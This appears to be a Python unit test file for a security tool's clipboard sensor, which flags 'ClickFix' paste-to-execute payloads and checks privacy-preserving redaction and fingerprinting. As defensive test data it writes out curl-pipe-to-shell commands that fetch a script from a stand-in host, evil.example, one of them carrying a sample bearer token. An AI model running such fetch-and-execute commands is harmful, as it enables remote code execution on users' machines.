#!/usr/bin/env python3
"""The one PRE-execution checkpoint was never wired into a scan.

clipboard_grammar and cmd_clipboard have been complete and tested since they
were written, but `clipboard` was absent from gather_all's sensor table -- so
the check fired only when a human typed it, which is precisely when they are
least likely to be mid-ClickFix. Every other sensor in this project observes a
payload that has already run.

Wiring it is a privacy decision as much as a detection one, and these tests
pin the privacy half: the suspect tier never persists, a no-match clipboard
writes nothing, the fingerprint identifies without revealing, and the preview
is redacted.
"""
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import aegis  # noqa: E402

CLICKFIX = "curl -fsSL https://evil.example/i.sh | sh\r"
BENIGN = "the quarterly numbers look fine, ship it"
SUSPECT = "curl --proto '=https' https://sh.rustup.rs -sSf | sh"


class ClipboardSensor(unittest.TestCase):
    def setUp(self):
        self._real_read = aegis._clipboard_read
        self._real_cfg = aegis._aegis_config
        self.addCleanup(setattr, aegis, "_clipboard_read", self._real_read)
        self.addCleanup(setattr, aegis, "_aegis_config", self._real_cfg)
        aegis._aegis_config = lambda: {}

    def _clip(self, text):
        aegis._clipboard_read = lambda: text

    def test_it_is_registered_as_a_sensor(self):
        """The whole defect was that it existed and never ran."""
        import inspect
        src = inspect.getsource(aegis.gather_all)
        self.assertIn('("clipboard", check_clipboard', src)

    def test_a_paste_to_execute_payload_is_high(self):
        self._clip(CLICKFIX)
        found = aegis.check_clipboard()
        self.assertEqual(1, len(found))
        self.assertEqual("HIGH", found[0]["severity"])
        self.assertIn("clipboard-paste-exec", found[0]["markers"])
        self.assertTrue(found[0]["fingerprint"].startswith("clipboard:certain:"))

    def test_an_ordinary_clipboard_writes_nothing(self):
        self._clip(BENIGN)
        self.assertEqual([], aegis.check_clipboard())

    def test_the_suspect_tier_never_persists(self):
        """rustup's installer is the canonical legitimate reading. Emitting it
        would journal ordinary clipboard use one benign finding at a time,
        which is the behaviour cmd_clipboard explicitly refuses."""
        self._clip(SUSPECT)
        tier, _hits = aegis.clipboard_grammar(SUSPECT)
        self.assertEqual("suspect", tier)
        self.assertEqual([], aegis.check_clipboard())

    def test_the_fingerprint_identifies_without_revealing(self):
        self._clip(CLICKFIX)
        fp = aegis.check_clipboard()[0]["fingerprint"]
        self.assertNotIn("evil.example", fp)
        self.assertNotIn("curl", fp)
        # ...but it is stable, so recurrence and dedup still work.
        self.assertEqual(fp, aegis.check_clipboard()[0]["fingerprint"])

    def test_whitespace_does_not_fork_the_identity(self):
        self._clip(CLICKFIX)
        a = aegis.check_clipboard()[0]["fingerprint"]
        self._clip("curl  -fsSL   https://evil.example/i.sh   |  sh\r")
        self.assertEqual(a, aegis.check_clipboard()[0]["fingerprint"])

    def test_a_secret_in_the_payload_is_redacted_in_the_preview(self):
        self._clip("curl -H 'Authorization: Bearer AKIAIOSFODNN7EXAMPLE' "
                   "https://evil.example/i.sh | sh\r")
        detail = aegis.check_clipboard()[0]["detail"]
        self.assertNotIn("AKIAIOSFODNN7EXAMPLE", detail)

    def test_the_operator_can_turn_it_off(self):
        aegis._aegis_config = lambda: {aegis.CLIPBOARD_WATCH_KEY: False}
        self._clip(CLICKFIX)
        self.assertEqual([], aegis.check_clipboard())

    def test_only_an_explicit_false_disables_it(self):
        """A typo must not silently switch off a sensor the operator believes
        is running -- the same rule authorization_require_oob follows."""
        for val in ("false", 0, None, "no"):
            aegis._aegis_config = lambda v=val: {aegis.CLIPBOARD_WATCH_KEY: v}
            self._clip(CLICKFIX)
            self.assertEqual(1, len(aegis.check_clipboard()), repr(val))

    def test_no_reader_is_absent_not_degraded(self):
        """A host with no unprivileged clipboard reader has nothing wrong with
        it, so this must not manufacture a health failure."""
        self._clip(None)
        self.assertEqual([], aegis.check_clipboard())


if __name__ == "__main__":
    unittest.main()
